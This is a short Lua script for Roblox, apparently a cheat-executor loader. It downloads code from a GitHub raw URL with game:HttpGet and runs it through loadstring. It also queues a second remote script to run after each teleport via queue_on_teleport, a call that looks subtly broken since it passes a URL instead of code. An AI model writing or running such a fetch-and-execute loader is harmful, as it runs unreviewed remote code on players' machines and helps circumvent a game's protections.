repeat task.wait() until game:IsLoaded()
loadstring(
    game:HttpGet(
        'https://raw.githubusercontent.com/Verteniasty/Pet-rbx/refs/heads/main/loadstring'
    )
)()

local QueueOnTeleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)

local Players = game:GetService("Players")
repeat task.wait() until Players.LocalPlayer
local LocalPlayer = Players.LocalPlayer


LocalPlayer.OnTeleport:Connect(function(State)
        QueueOnTeleport("https://raw.githubusercontent.com/ThemPrices/meat/refs/heads/main/lapppp.lua")
end)
